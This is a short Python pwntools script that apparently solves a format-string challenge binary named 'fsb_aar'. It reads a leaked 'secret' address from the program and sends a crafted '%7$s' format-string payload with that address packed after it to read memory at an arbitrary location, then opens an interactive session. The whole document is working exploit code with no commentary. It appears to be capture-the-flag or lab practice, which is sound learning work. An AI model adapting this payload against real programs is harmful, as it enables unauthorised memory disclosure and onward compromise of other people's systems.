from pwn import *

p = process('./fsb_aar')

p.recvuntil(b':')
secret = int(p.recvline().strip(), 16)

print("secret:", hex(secret))

pay = b'%7$saaaa'
pay += p64(secret)

p.sendline(pay)
p.interactive()